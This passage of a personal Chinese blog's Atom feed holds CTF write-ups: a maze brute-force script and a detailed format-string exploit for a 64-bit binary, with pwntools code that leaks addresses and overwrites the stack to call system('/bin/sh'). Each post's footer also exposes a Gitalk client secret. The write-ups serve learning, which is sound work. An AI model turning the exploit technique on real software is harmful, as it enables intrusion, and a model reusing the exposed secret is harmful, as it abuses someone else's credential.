class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from itertools import *</span><br><span class="line"></span><br><span class="line">def crack():</span><br><span class="line">left&#x3D;right&#x3D;up&#x3D;down&#x3D;&#39;.&#39;</span><br><span class="line">j&#x3D;1</span><br><span class="line">for i in permutations(&#39;Oo.0&#39;,4):</span><br><span class="line">left,right,up,down&#x3D;i</span><br><span class="line">way&#x3D;right+down+2*right+2*down+left+3*down+4*right+2*up+left*2</span><br><span class="line">p&#x3D;process(&#39;.&#x2F;maze&#39;)</span><br><span class="line">#gdb.attach(p,&#39;b *0x400827&#39;)</span><br><span class="line">p.sendline(&#39;nctf&#123;&#39;+way+&#39;&#125;&#39;)</span><br><span class="line">log.success(&#39;j&#x3D;&#39;+str(j)+&#39; sent:&#39;+&#39;nctf&#123;&#39;+way+&#39;&#125;&#39;)</span><br><span class="line">if &#39;Congratulations!\n&#39; in p.recv():</span><br><span class="line">print way</span><br><span class="line">break</span><br><span class="line">j+&#x3D;1</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">crack()</span><br></pre></td></tr></table></figure><p>没啥好说的，拿排列组合偷了个懒。顺便记一下<code>itertools</code>里C几几（无序）是<code>combinations</code>。<br><br>我知道这题不难！但是没人好好说我就烦！（完）</p><div id="gitalk-container"></div><script src="https://cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script><link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css"><script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script><script>var gitalkConfig = {"clientID":"0324b72a8577ea998218","clientSecret":"5e75c103ffafadd523fe6228fad280b3ec5a4972","repo":"comments","owner":"ll1ng","admin":["ll1ng"],"distractionFreeMode":false};    gitalkConfig.id = md5(location.pathname);var gitalk = new Gitalk(gitalkConfig);    gitalk.render("gitalk-container");    </script>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;xctf里新手区的那道maze&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Re" scheme="http://ll1ng.github.io/tags/Re/"/>
    
  </entry>
  
  <entry>
    <title>小朋友，儿童节快乐鸭</title>
    <link href="http://ll1ng.github.io/2020/06/01/fmt/"/>
    <id>http://ll1ng.github.io/2020/06/01/fmt/</id>
    <published>2020-05-31T16:00:00.000Z</published>
    <updated>2020-07-30T15:45:04.971Z</updated>
    
    <content type="html"><![CDATA[<p>这是一道fmt在bss段上的题。通过这道题我对格式化字符串的理解上了一个新的台阶…</p><a id="more"></a><p>&emsp;&emsp;第一篇技术类博文诶！先激动一下下~<br><br>&emsp;&emsp;<strong>（本文中fmt均指格式化字符串）通篇是结合wiki和做题的个人理解，错误之处望读者不吝赐教</strong><br><br>&emsp;&emsp;fmt这个漏洞比较考验对指针的理解，初次接触时可能会比较吃力（主要指我）。总的来说，经过西工大这两道题，我对fmt这个漏洞的理解如下：<br></p><ul><li>fmt读的漏洞：<ul><li>可以通过<code>%n$p</code>直接获得fmt相对偏移处的数值。原理是当成指针输出（十六进制形式，32位64位都可）</li><li>可以通过<code>%n$s</code>获得偏移处（这是一个地址）所指向的内存的内容。原理是当成字符串地址去解析并输出该地址对应内存的字符串形态。所以当此处被当成地址却不合法时程序会报segment fault错。</li></ul></li><li>fmt写的漏洞<ul><li>通过<code>%nc$hhn</code>,hn,n（$前的n表示任意整数，c表示以字符形式，我比较常用，$后为固定用法）可向偏移处<strong>所指向的内存</strong>最低字节/最低两字节/最低四字节写入printf已打印出的字符个数。（此处表述可能不够严谨，因为会有想要修改的内存地址不是整8位，4位的情况，这种情况下hhn可使用，hn和n的效果倒是还没试过）<code>%nc%n$hhn</code>，可如是使用。</li></ul></li></ul><blockquote><p>注1：n指相对于fmt的偏移。32位在栈上依次是1,2,3…；64位前6个参数在寄存器（包括存放fmt地址的rdi寄存器），之后的参数在栈上（第一个在栈上的数据是printf的第七个参数，相对fmt偏移为6）</p></blockquote><blockquote><p>注2：写的漏洞描述如上，也就是说能够通过偏移直接改写的只有存放二级及以上指针的内存，直接改写会报错。（6.19：一级应该是部分可以改，要看目标地址是否合法（存在及可写））</p></blockquote><p>题目64位，ida结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(stdout, 0LL, 2, 0LL);</span><br><span class="line">  setvbuf(stdin, 0LL, 2, 0LL);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    read(0, buf, 0x64uLL);</span><br><span class="line">    if ( !strcmp(buf, &quot;66666666&quot;) )</span><br><span class="line">      break;</span><br><span class="line">    printf(buf, &quot;66666666&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>双击buf，我们看到buf在bss段。这里尝试解释一下fmt在bss段是如何增加难度的。在栈上时，我们能够控制的输入在栈上，可直接通过<code>%nc%n$hhn</code>对我们的输入（想要修改的变量所在的地址）所指向的内存进行修改。在bss段上则无法直接通过上述接触到输入，也就无法直接进行修改。<br>首先说明如何找到<code>pop rdi ret</code>和<code>system</code>，<code>/bin/sh</code>所在地址<br>在printf处下断点，然后<code>stack 31</code><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack 31</span><br><span class="line">00:0000│ rsp  0x7fffffffdde8 —▸ 0x555555554824 (main+138) ◂— jmp    0x5555555547da</span><br><span class="line">01:0008│ rbp  0x7fffffffddf0 —▸ 0x555555554830 (__libc_csu_init) ◂— push   r15</span><br><span class="line">02:0010│      0x7fffffffddf8 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov    edi, eax</span><br><span class="line">03:0018│      0x7fffffffde00 ◂— 0x1</span><br><span class="line">04:0020│      0x7fffffffde08 —▸ 0x7fffffffded8 —▸ 0x7fffffffe241 ◂— &#39;&#x2F;home&#x2F;ling&#x2F;now&#x2F;game&#x2F;now&#x2F;history&#x2F;west&#x2F;hill&#x2F;deploy_pwn&#x2F;deploy&#x2F;format_level2&#x2F;src&#x2F;pwn&#39;</span><br><span class="line">05:0028│      0x7fffffffde10 ◂— 0x1f7ffcca0</span><br><span class="line">06:0030│      0x7fffffffde18 —▸ 0x55555555479a (main) ◂— push   rbp</span><br><span class="line">07:0038│      0x7fffffffde20 ◂— 0x0</span><br><span class="line">08:0040│      0x7fffffffde28 ◂— 0x2cc87ef76f3dd02d</span><br><span class="line">09:0048│      0x7fffffffde30 —▸ 0x555555554690 (_start) ◂— xor    ebp, ebp</span><br><span class="line">0a:0050│      0x7fffffffde38 —▸ 0x7fffffffded0 ◂— 0x1</span><br><span class="line">0b:0058│      0x7fffffffde40 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">0d:0068│      0x7fffffffde50 ◂— 0x799d2ba2435dd02d</span><br><span class="line">0e:0070│      0x7fffffffde58 ◂— 0x799d3b18508dd02d</span><br><span class="line">0f:0078│      0x7fffffffde60 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">12:0090│      0x7fffffffde78 —▸ 0x7fffffffdee8 —▸ 0x7fffffffe293 ◂— &#39;XDG_VTNR&#x3D;7&#39;</span><br><span class="line">13:0098│      0x7fffffffde80 —▸ 0x7ffff7ffe168 —▸ 0x555555554000 ◂— jg     0x555555554047</span><br><span class="line">14:00a0│      0x7fffffffde88 —▸ 0x7ffff7de77db (_dl_init+139) ◂— jmp    0x7ffff7de77b0</span><br><span class="line">15:00a8│      0x7fffffffde90 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">17:00b8│      0x7fffffffdea0 —▸ 0x555555554690 (_start) ◂— xor    ebp, ebp</span><br><span class="line">18:00c0│      0x7fffffffdea8 —▸ 0x7fffffffded0 ◂— 0x1</span><br><span class="line">19:00c8│      0x7fffffffdeb0 ◂— 0x0</span><br><span class="line">1a:00d0│      0x7fffffffdeb8 —▸ 0x5555555546ba (_start+42) ◂— hlt    </span><br><span class="line">1b:00d8│      0x7fffffffdec0 —▸ 0x7fffffffdec8 ◂— 0x1c</span><br><span class="line">1c:00e0│      0x7fffffffdec8 ◂— 0x1c</span><br><span class="line">1d:00e8│ r13  0x7fffffffded0 ◂— 0x1</span><br><span class="line">1e:00f0│      0x7fffffffded8 —▸ 0x7fffffffe241 ◂— &#39;&#x2F;home&#x2F;ling&#x2F;now&#x2F;game&#x2F;now&#x2F;history&#x2F;west&#x2F;hill&#x2F;deploy_pwn&#x2F;deploy&#x2F;format_level2&#x2F;src&#x2F;pwn&#39;</span><br></pre></td></tr></table></figure><p>首先找目标地址吧。<br><code>pop rdi ret</code>可用<code>ROPgadget</code>找到，其实还需要<code>ret</code>，因为题目说明远程是18.04，有个对齐的问题，不加<code>ret</code>的话16.04本地能打通但是远程会报错<code>timeout: the monitored command dumped core</code>。具体原因可见<a href="https://www.cnblogs.com/Rookle/p/12871878.html" target="_blank" rel="noopener">这篇博客</a>。<br>不难发现加载时程序地址随机，不过后三位一定，所以我们可以先在调试时确定目标地址和我们能够得到的地址的偏移，然后通过运行时泄露能够得到的地址和偏移计算出目标地址。结合<code>vmmap</code>，栈和库的位置同样可以如此获得。这里我分别用偏移为1处获得<code>pop rdi ret</code>，9处获得栈的地址（并计算栈顶），7处获得库中<code>__libc_start_main</code>的地址，从而得知<code>system</code>和<code>/bin/sh</code>的地址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#get_file_offset to get pop rdi</span><br><span class="line">p.sendline(&quot;%p\0&quot;)</span><br><span class="line">one_arg_offset&#x3D;int(p.recv(14),16)</span><br><span class="line">file_base&#x3D;one_arg_offset-0x8b4</span><br><span class="line">pop_rdi&#x3D;file_base+0x893</span><br><span class="line">ret&#x3D;0x626+file_base</span><br><span class="line">log.info(&#39;pop rdi:&#39;+hex(pop_rdi))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#get_stack_rsp_offset</span><br><span class="line">p.sendline(&quot;%9$p\0&quot;)#addr in stack</span><br><span class="line">stack0&#x3D;int(p.recv(14),16)-232</span><br><span class="line">#change here doen&#39;t matter where to jump</span><br><span class="line">stack&#x3D;stack0-8</span><br><span class="line">log.info(&#39;stack0:&#39;+hex(stack0))</span><br><span class="line">new_jump&#x3D;184+stack0</span><br><span class="line">#at offset 29</span><br><span class="line">log.info(&quot;new_jump:&quot;+hex(new_jump))</span><br><span class="line">#get_libc_3rd_offset</span><br><span class="line">p.sendline(&quot;%7$p\0&quot;)</span><br><span class="line">libc_start_main&#x3D;int(p.recv(14),16)-240</span><br><span class="line">log.info(&#39;libc_start_main:&#39;+ hex(libc_start_main))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc&#x3D;LibcSearcher(&quot;__libc_start_main&quot;,libc_start_main)</span><br><span class="line">libc_base &#x3D; libc_start_main - libc.dump(&quot;__libc_start_main&quot;)</span><br><span class="line">system_addr &#x3D; libc_base + libc.dump(&quot;system&quot;)</span><br><span class="line">bin_sh &#x3D; libc_base + libc.dump(&quot;str_bin_sh&quot;)</span><br><span class="line">log.info(&quot;libc_base:&quot;+hex(libc_base))</span><br><span class="line">log.info(&#39;system:&#39;+hex(system_addr))</span><br><span class="line">log.info(&#39;bin_sh:&#39;+hex(bin_sh))</span><br></pre></td></tr></table></figure><p>接下来进行修改。<br>手动改的过程中发现进入printf前除了栈顶，栈顶+8，+16的位置都可以修改且修改能一直不被破坏，所以选择先修改栈顶以下的内容，最后再修改栈顶跳转到<code>pop rdi ret</code>处。（其实应该看汇编的吧。。我怎么就赖上调试了呢，害）<br>以下是我修改的具体操作：在栈上找到一个指向栈内地址的二级及以上指针。我一开始找的是偏移为9处，跳板就在对应的35处。手动改的时候感觉9和35这两个地方挺稳定的，因为printf完后在下一次printf前就能看到结果，然鹅是我太天真…调试的时候发现再经过一次printf，35处低两字节就会变到0007。<del>甚至还跑去问槐它为什么自己会变指向，我没被打死真是一个奇迹</del>不过既然能控制一次，那么每次都重新改一次指向应该也能做所以就没换地方，继续用35处做的题。<br><br>接下来就是手动改了。注意到地址基本都是6个字节（啊你在说什么你这个全靠调试不看书的家伙！）所以编写了这两个函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">def point_to_target(addr):</span><br><span class="line">    payload&#x3D;&#39;%&#123;&#125;c%9$hn&#39;.format(int(hex(new_jump)[-4:],16))</span><br><span class="line">    p.sendline(payload.ljust(99,&#39;\x00&#39;))</span><br><span class="line">    p.recv()</span><br><span class="line">    payload&#x3D;&#39;%&#123;&#125;c%35$hn&#39;.format(int(hex(addr)[-4:],16))</span><br><span class="line">    p.sendline(payload.ljust(99,&#39;\x00&#39;))</span><br><span class="line">    p.recv()</span><br><span class="line"></span><br><span class="line">def change(addr,value):</span><br><span class="line">    svalue&#x3D;hex(value)[2:]#12 bit,6 byte</span><br><span class="line">    print svalue</span><br><span class="line">    for i in range(5,-1,-1):  </span><br><span class="line">        print svalue[2*i:2*i+2]</span><br><span class="line">        point_to_target(addr+5-i)        </span><br><span class="line">        log.info(&quot;point to stack0+&#123;&#125;&quot;.format(5-i))        </span><br><span class="line">        #p.recv()</span><br><span class="line">        payload&#x3D;&#39;%&#123;&#125;c%29$hhn&#39;.format(int(svalue[2*i:2*i+2],16))</span><br><span class="line">        p.sendline(payload.ljust(99,&#39;\x00&#39;))</span><br><span class="line">        p.recv()</span><br></pre></td></tr></table></figure><p>值得注意的一个地方是read函数接收到<code>\0</code>也不会截断，所以我填补99个<code>\x00</code>并连带<code>sendline</code>最后的换行符一共100个字符。也可以<code>payload.ljust(&#39;\x00&#39;,100)</code>然后用<code>send</code>发送。（咳咳，7.30我来打脸。read读的时候可以直接send()…我整麻烦了。<strong>这里还有个奇怪的东东没搞懂就是输入会堆在一起那个现象</strong>）最后修改部分的exp如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">change(stack0,bin_sh)</span><br><span class="line">change(stack0+8,system_addr)</span><br><span class="line">point_to_target(stack)</span><br><span class="line">svalue&#x3D;hex(pop_rdi)</span><br><span class="line">payload&#x3D;&#39;%&#123;&#125;c%29$hhn&#39;.format(int(svalue[-4:],16))</span><br><span class="line">p.sendline(payload.ljust(99,&#39;\x00&#39;))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>环境关闭木有远程打的机会了，<code>ret</code>的部分就<del>懒得</del>没加，道理应该是一样的。不过加<code>ret</code>的话会改到9的位置，emm有点子问题。先留坑，以后再填。溜了溜了</p><h3 id="6-27用one-gadget做了一下"><a href="#6-27用one-gadget做了一下" class="headerlink" title="6.27用one_gadget做了一下"></a>6.27用<code>one_gadget</code>做了一下</h3><p>额，心态有点炸，因为又是调试出来的，但是不会调其他版本就很伤…这个汇编实际执行情况和我预料的出入有点大，先记下来以后看看能不能明白8<br></p><p>呃呃还知道了<code>one gadget libc</code>结果的后面<code>==NULL</code>的意思是执行条件，后面堆要是都不满足的话还得自己构造。行（</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p&#x3D;process(&quot;.&#x2F;pwn&quot;)</span><br><span class="line">#p&#x3D;process([&#39;.&#x2F;pwn&#39;],env&#x3D;&#123;&quot;LD_PRELOAD&quot;:&#39;.&#x2F;libc-2.27.so&#39;&#125;)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">libc&#x3D;ELF(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so&#39;)</span><br><span class="line">one_gadget223&#x3D;0xf1147</span><br><span class="line"></span><br><span class="line">#get_file_offset to get pop rdi</span><br><span class="line">p.sendline(&quot;%p\0&quot;)</span><br><span class="line">one_arg_offset&#x3D;int(p.recv(14),16)</span><br><span class="line">file_base&#x3D;one_arg_offset-0x8b4</span><br><span class="line">pop_rdi&#x3D;file_base+0x893</span><br><span class="line">ret&#x3D;0x626+file_base</span><br><span class="line">log.info(&#39;pop rdi:&#39;+hex(pop_rdi))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#get_stack_rsp_offset</span><br><span class="line">p.sendline(&quot;%9$p\0&quot;)#addr in stack</span><br><span class="line">stack0&#x3D;int(p.recv(14),16)-232</span><br><span class="line">#change here doen&#39;t matter where to jump</span><br><span class="line">stack&#x3D;stack0-8</span><br><span class="line">log.info(&#39;stack0:&#39;+hex(stack0))</span><br><span class="line">new_jump&#x3D;184+stack0</span><br><span class="line">#at offset 29</span><br><span class="line">log.info(&quot;new_jump:&quot;+hex(new_jump))</span><br><span class="line">#get_libc_3rd_offset</span><br><span class="line">p.sendline(&quot;%7$p\0&quot;)</span><br><span class="line">#print p.recvuntil(&#39;0x&#39;)</span><br><span class="line">libc_start_main&#x3D;int(p.recv(14),16)-240</span><br><span class="line">log.info(&#39;libc_start_main:&#39;+ hex(libc_start_main))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">one_gadget_actual&#x3D;libc_start_main-libc.sym[&#39;__libc_start_main&#39;]+one_gadget223</span><br><span class="line">log.info(&quot;one gadget:&quot;+hex(one_gadget_actual))</span><br><span class="line"></span><br><span class="line">def point_to_target(addr):</span><br><span class="line">    payload&#x3D;&#39;%&#123;&#125;c%9$hn&#39;.format(int(hex(new_jump)[-4:],16))</span><br><span class="line">    p.sendline(payload.ljust(99,&#39;\x00&#39;))</span><br><span class="line">    p.recv()</span><br><span class="line">    payload&#x3D;&#39;%&#123;&#125;c%35$hn&#39;.format(int(hex(addr)[-4:],16))</span><br><span class="line">    p.sendline(payload.ljust(99,&#39;\x00&#39;))</span><br><span class="line">    p.recv()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def change(addr,value):</span><br><span class="line">    svalue&#x3D;hex(value)[2:]#12 bit,6 byte</span><br><span class="line">    print svalue</span><br><span class="line">    for i in range(5,-1,-1):  </span><br><span class="line">        print svalue[2*i:2*i+2]</span><br><span class="line">        point_to_target(addr+5-i)        </span><br><span class="line">        log.info(&quot;point to stack0+&#123;&#125;&quot;.format(5-i))        </span><br><span class="line">        #p.recv()</span><br><span class="line">        payload&#x3D;&#39;%&#123;&#125;c%29$hhn&#39;.format(int(svalue[2*i:2*i+2],16))</span><br><span class="line">        p.sendline(payload.ljust(99,&#39;\x00&#39;))</span><br><span class="line">        p.recv()</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">change(stack0+8,one_gadget_actual)</span><br><span class="line">log.info(&quot;stack0 change&quot;)</span><br><span class="line">change(stack0,ret)</span><br><span class="line">point_to_target(stack)</span><br><span class="line">svalue&#x3D;hex(ret)</span><br><span class="line">payload&#x3D;&#39;%&#123;&#125;c%29$hhn&#39;.format(int(svalue[-4:],16))</span><br><span class="line">p.sendline(payload.ljust(99,&#39;\x00&#39;))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>问题出在将栈顶改为<code>ret</code>而+8的位置改为<code>one_gadget</code>时汇编最后<code>pop rbp ret</code>，<code>ret</code>的是+16处<code>__libc_start_main+240</code>…懵逼，我就又加了一句<code>ret</code>。<br></p><p>隔得久了我不知道上一句我在说啥，反正上面脚本跑不通，再留坑。整体来说这个方法不是太好感觉，可拓展性不够强。</p><div id="gitalk-container"></div><script src="https://cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script><link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css"><script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script><script>var gitalkConfig = {"clientID":"0324b72a8577ea998218","clientSecret":"5e75c103ffafadd523fe6228fad280b3ec5a4972","repo":"comments","owner":"ll1ng","admin":["ll1ng"],"distractionFreeMode":false};    gitalkConfig.id = md5(location.pathname);var gitalk = new Gitalk(gitalkConfig);    gitalk.render("gitalk-container");    </script>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这是一道fmt在bss段上的题。通过这道题我对格式化字符串的理解上了一个新的台阶…&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="pwn_stack" scheme="http://ll1ng.github.io/tags/pwn-stack/"/>
    
  </entry>
  
  <entry>
    <title>我来试试</title>
    <link href="http://ll1ng.github.io/2020/03/27/%E6%88%91%E6%9D%A5%E8%AF%95%E8%AF%95/"/>
    <id>http://ll1ng.github.io/2020/03/27/%E6%88%91%E6%9D%A5%E8%AF%95%E8%AF%95/</id>
    <published>2020-03-27T15:03:54.000Z</published>
    <updated>2021-04-04T09:50:29.572Z</updated>
    
    <content type="html"><![CDATA[<p>博客终于差不多能见人了…<br></p><a id="more"></a><p>那么国际惯例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(&quot;hello world&quot;)</span><br></pre></td></tr></table></figure><h3 id="关于搭建"><a href="#关于搭建" class="headerlink" title="关于搭建"></a>关于搭建</h3><p><del>果然猛男就是要把博客布置得花里胡哨才肯罢休</del><br>还有一部分功能没实现，等6月后吧。<br>个性化之前所有的操作都来自于大哥的<a href="https://www.wootec.top/2019/08/19/%E7%94%A8Next%E7%BE%8E%E5%8C%96-HEXO-GitHub-%E5%8D%9A%E5%AE%A2/" target="_blank" rel="noopener">这篇博客</a>和小姐妹的<a href="http://cor1e.cn/2019/10/03/1/#more" target="_blank" rel="noopener">这篇</a>。懒得查资料就直接白嫖了，感谢二位！<br><br>终于可以先安心写会儿作业了ε=(´ο｀*)))<del>我听到了咕咕咕的声音</del><br></p><!-- ### 我想在这里表达什么&emsp;&emsp;其实有点点想把这里搞成哲学||文学||艺术博来着...<br>&emsp;&emsp;长时间以来自己学习都挺不踏实的。总是感觉自己在某些方面多知道多接触过些什么就想表达出来，感觉这样挺不健康的吧。害怕别人知道自己不知道（动宾不是并列），害怕自己当众犯错。其实也清楚地知道这样对进步挺致命的。这毛病一直都有，但是到大学自己明显地感受到了这种心理给自己带来的焦虑。<br>&emsp;&emsp;学习漏洞经常是，开头瞎摸索，中间发现自己自学得不扎实，最后花好久的时间纠结要不要问，问谁，最后才艰难地解决，挺糟糕的吧。好在觉得学习能力有被锻炼到。<br>        打算这个地方主要记一些pwn的调试和基础知识，ctf比较杂的笔记打算记得少一点，尽量提高每一篇的质量。（所以更新应该会非常慢）<br>&emsp;&emsp;记得很清楚高中时期使命感很强，为科学界的前辈们乃至整个人类为找寻真理做出的贡献与牺牲而感动。...然后来到了工科。不过现在状态比一年前好多啦，冥冥中也算是找到了新的使命。虽然还是，自尊心经常被神仙同学们虐到。。<br>&emsp;&emsp;希望为这个领域的后来者提供帮助鸭。（毕竟自己摸索的这个过程太惨烈了）pwn希望自己一直能学下去^_^<br> --><!-- - 5.28 搞了下评论- 7.30 博客的定位变一下。帮助什么的，我不配，太狂妄了。打算记一些不太容易查到或者关注到的从而导致“知识的诅咒”现象的，自己的一丢丢发现和理解吧。（总结下就是，不一样的东西）大概会有帮助emm。断更可能是因为陷入了长时间的自闭hhh。每当此时我都会掏出自己收藏的一篇“你为什么要写博客”的回答给自己打鸡血23333。最近状态还阔以，继续干活！ --><h3 id="“我”"><a href="#“我”" class="headerlink" title="“我”"></a>“我”</h3><p>&emsp;&emsp;20210328：这个地方诞生一年多了呢。寒假里想了很多东西。我的挣扎、我的不安和焦虑、我未来想做什么。三年来其实自己想追求的东西都没有变，就是智慧。所以我永远会想看到更本质的东西。（虽然现在不知道到底还有没有精力）放在人文领域我想看到社会现象的本质，在计算机领域自然而然我也会想，是否研究底层能给我带来类似“看到本质”的快乐呢。<br><br>&emsp;&emsp;真想多尝试尝试啊，可地上的事情真是纷扰。</p><div id="gitalk-container"></div><script src="https://cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script><link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css"><script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script><script>var gitalkConfig = {"clientID":"0324b72a8577ea998218","clientSecret":"5e75c103ffafadd523fe6228fad280b3ec5a4972","repo":"comments","owner":"ll1ng","admin":["ll1ng"],"distractionFreeMode":false};    gitalkConfig.id = md5(location.pathname);var gitalk = new Gitalk(gitalkConfig);    gitalk.render("gitalk-container");    </script>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;博客终于差不多能见人了…&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="日常碎碎念" scheme="http://ll1ng.github.io/tags/%E6%97%A5%E5%B8%B8%E7%A2%8E%E7%A2%8E%E5%BF%B5/"/>
    
  </entry>
  
</feed>
